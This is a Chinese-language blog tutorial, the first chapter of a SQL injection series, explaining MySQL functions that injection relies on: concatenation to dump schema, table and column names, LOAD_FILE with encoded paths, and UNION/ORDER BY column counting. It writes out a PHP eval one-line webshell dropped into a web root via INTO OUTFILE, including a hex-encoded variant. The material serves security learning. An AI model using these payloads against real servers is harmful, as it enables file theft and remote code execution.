---
title: SQL注入系列Chapter 1：MySQL基础知识
date: 2019-03-12 10:14:38
tags: 
	- SQL注入
	- MySQL
categories: WEB漏洞学习
---

## 一、MySQLi常用函数

### 0x00 系统函数

- **`@@version_compile_os`**：操作系统版本
- **`@basedir`**：MySQL安装路径
- **`version()`**：MySQL版本
- **`user()`**：当前数据库用户
- **`@@datadir`**：数据库路径
- **`database()`**：当前所处数据库名

<!-- more -->

![](0x00-SQL注入系列之Mysql基础知识\QQ截图20190312102557.png)

### 0x01 字符串拼接函数

- **`Concat()`**
- **`Concat_WS()`**
- **`GROUP_CONCAT()`**

> 在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。

**1.Concat(str1,str2,…)**

返回结果为拼接参数得到的字符串。

如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。

![](0x00-SQL注入系列之Mysql基础知识\01.png)

- **`select concat(user,",",password) from mysql.user;`**

![](0x00-SQL注入系列之Mysql基础知识\02.png)

**2.Concat_WS(separator,str1,str2,…)**

`separator`为拼接字符串之间的分隔符。

![](0x00-SQL注入系列之Mysql基础知识\03.png)

![](0x00-SQL注入系列之Mysql基础知识\04.png)

**3.GROUP_CONCAT()**

![](0x00-SQL注入系列之Mysql基础知识\QQ截图20190312110721.png)

将DBMS中所有数据库名作为一列返回：

- **`select group_concat(schema_name) from information_schema.schemata;`**

将指定数据库的所有表名作为一列返回：

- **`select group_concat(table_name) from information_schema.tables where table_schema='db_name';`**

将指定数据表的所有列名作为一列返回：

- **`select group_concat(column_name) from information_schema.columns where table_name='tb_name';`**

### 0x02 字符/数字函数

- **`ASCII()`**: 返回字符对应的ASCII码值。
- **`ORD()`**：返回字符对应的ASCII码值。
- **`CHAR()`**：返回数字对应的ASCII字符。

![](0x00-SQL注入系列之Mysql基础知识\05.png)

- **`BIN()`**: 返回数字对应的二进制串。
- **`CONV(Num,from_base,to_base)`**: 数字进制转换。

![](0x00-SQL注入系列之Mysql基础知识\06.png)

- **`HEX()`**:十六进制编码
- **`UNHEX()`**：十六进制解码

![](0x00-SQL注入系列之Mysql基础知识\07.png)

- **`FLOOR()`**：向下取整
- **`RAND()`**：用于产生一个0~1的随机数

![](0x00-SQL注入系列之Mysql基础知识\08.png)

- **`LOWER()`**：转成小写字母
- **`UPPER()`**: 转成大写字母

### 0x03 字符串切片函数

- **`MID(string，start，count)`**：从字符串下标为`start`处开始切取`count`个字符（下标从1开始）。
- **`SUBSTR()`**：同上。
- **`SUBSTRING()`**：同上。
- **`LEFT(string, n)`**：获取从字符串左边开始的指定n个字符。

![](0x00-SQL注入系列之Mysql基础知识\09.png)

### 0x04 盲注相关函数

- **`sleep(n)`**：阻塞n秒。
- **`len()`**：返回字符串的长度。
- **`if(expr1,expr2,expr3)`**：如果expr1是TRUE ，则值为expr2; 否则为 expr3。

### 0x05 读文件 Load_file()

> 读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。

**使用条件**：

> 1. 连接数据库的用户有`file_priv`权限，启动`mysqld`用户必须拥有对此文件读取的权限。
>
>    > 查看用户的`file_priv`权限：`select User,File_priv from mysql.user;`
>
> 2. 欲读取文件必须在服务器上。
>
> 3. 必须指定文件的绝对路径。
>
> 4. 欲读取文件必须小于 max_allowed_packet。
>
>    > 查看允许最大包长度：`show global variables like "max_allow%";`
>
> 5. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。
>
>    > 查看允许读取的路径：`show  variables like "secure_file%";`

**使用例子：**

>  注意路径符号的处理，要么使用`/`，使用Windows的`\`需要进行转义，即`\\`。
>
> 1. **`SELECT LOAD_FILE("C://TEST.txt")`**
>
> 2. **`SELECT LOAD_FILE("C:/TEST.txt")`**
>
> 3. **`SELECT LOAD_FILE("C:\\TEST.txt")`**
>
> 4. **`SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))`**
>
>    > `CHAR(67,58,92,92,84,69,83,84,46,116,120,116)`得到的是`C:\\TEST.txt`。
>
> 5. **`SELECT LOAD_FILE(0x433a5c5c544553542e747874) `**
>
>    > `0x433a5c5c544553542e747874`是`C:\\TEST.txt`经过十六进制编码得到的。

### 0x03 写（导入）文件

**select ... into outfile ‘filepath’**

**select ... into dumpfile ‘filepath’**

> 可以把查询的行写入一个文件中。

**使用条件**：

> 1. 连接数据库的用户有`file_priv`权限，且启动`mysqld`的用户对目录需要有写权限。
>
> 2. 文件路径必须为绝对路径，`file_name`不能是一个已经存在的文件。
>
> 3. 如果`secure_file_priv`非NULL，则只能读取对应目录下的文件。当`secure_file_priv`的值为NULL ，表示限制`mysqld`不允许导入|导出。当`secure_file_priv`的值为空白，表示可以导入任意目录。
>
>    > `show  variables like "secure_file%";`

**写入Webshell条件**：

> 1. 需要知道网站的绝对物理路径，这样导出后的webshell可访问。
> 2. 写入的目录有写权限。
> 3. `secure_file_priv`非NULL且包含了WEB路径。

**写入Webshell**：

> - **`select "<?php @eval($_POST[sh4douu])?>"  into outfile "X:\\phpstudy\\PHPTutorial\\WWW\\shell.php";`**
> - **`select "<?php @eval($_POST[sh4douu])?>"  into dumpfile "X:\\phpstudy\\PHPTutorial\\WWW\\shell.php";`**

**LINES TERMINATED BY**

用于不是`Union Select`时。

> 1. 使用格式：
>
>    > **`Select version() into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY [十六进制数据]`**
>
> 2. 例子：
>
>    > **`Select user From mysql.user where user="root" limit 1 into outfile 'X:/phpstudy/PHPTutorial/WWW/shell.php' LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;`**
>    >
>    > > 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的`<?php @eval($_POST[sh4douu])?>`，`Lines Terminated By`就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为`root`，之后的一句话木马是`Lines Terminated By`之后的十六进制数据解码得到的字符。
>
> 3. 此外还有`FIELDS TERMINATED BY`也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。



![](0x00-SQL注入系列之Mysql基础知识\QQ截图20190312143549.png)

**dumpfile与outfile区别**：

1. `outfile` 可以导出每行。`dumpfile` 只能导出一行（将目标文件写入同一行内；
2. `outfile`不可导出二进制文件，文件会被破坏，转义等。`dumpfile`可导出完整可执行二进制文件。

### 0x04 Union Select

`UNION`操作符用于合并两个或多个`SELECT`语句的结果集。

`UNION`只是将两个查询结果联结起来在一列显示，并不是联结两个表。

`UNION ALL`和`UNION`不同之处在于`UNION ALL`会将所有符合条件的都列出来，既不去重复的值。而`UNION`去重。

**使用条件**：

>1. UNION 内部的 SELECT 语句必须拥有相同数量的列。
>2. 列也必须拥有相似的数据类型。
>3. 每条 SELECT 语句中的列的顺序必须相同。

![](0x00-SQL注入系列之Mysql基础知识\QQ截图20190318142002.png)

**Order by**

`ORDER BY`语句用于根据指定的列对结果集进行排序。

在SQLi中，`order by`用于寻找查询的列数，因为根据前面我们知道`union select`使用条件之一是要列数相等。

`order by`之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，`order by`允许接的最大数字就是实际查询的列数。

![](0x00-SQL注入系列之Mysql基础知识\QQ截图20190318142657.png)

### 0x05 注释

**行间注释：**

- **`--+ `**（--之后一个空格）
- **`#`**（浏览器访问时需要编码成%23，否则被当作锚点起始）
- `；%00`(空字节)
- *`*(反引号)

**行内注释：**

- **`/*注释*/`**
- Mysql中，`/*! SQL 语句 */` 这种格式里面的 SQL 语句会当正常的语句一样被解析。

